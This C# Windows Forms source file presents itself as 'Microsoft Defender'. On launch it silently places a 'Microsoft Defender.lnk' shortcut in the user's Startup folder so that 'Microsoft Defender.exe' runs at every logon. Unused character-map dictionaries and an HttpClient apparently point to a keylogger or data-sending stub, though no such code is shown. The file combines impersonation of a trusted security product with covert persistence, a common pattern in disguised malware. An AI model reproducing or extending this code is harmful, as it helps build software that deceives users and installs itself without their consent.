using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Http;
using Microsoft.VisualBasic.Devices;
using IWshRuntimeLibrary;

namespace Microsoft_Defender
{
    public partial class Form1 : Form
    {
        static Dictionary<int, char> englishLowercaseDict = new Dictionary<int, char>();
        static Dictionary<int, char> englishUppercaseDict = new Dictionary<int, char>();
        static HttpClient httpClient = new HttpClient();
        public Form1()
        {
            InitializeComponent();
            var ShortcutPath = Environment.CurrentDirectory + @"\Microsoft Defender.lnk";
            string TargetPath = Environment.CurrentDirectory + @"\Microsoft Defender.exe";
            WshShell wshShell = new WshShell();

            string user = Environment.UserName;

            string[] Drives = Environment.GetLogicalDrives();

            foreach (string s in Drives)
            {
                string path = s + @"Users\" + user + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
                if (Directory.Exists(path))
                {
                    ShortcutPath = path + @"\Microsoft Defender.lnk";
                }
            }

            IWshShortcut Shortcut = (IWshShortcut)wshShell.
                CreateShortcut(ShortcutPath);

            Shortcut.TargetPath = TargetPath;

            Shortcut.Save();
        }
    }
}


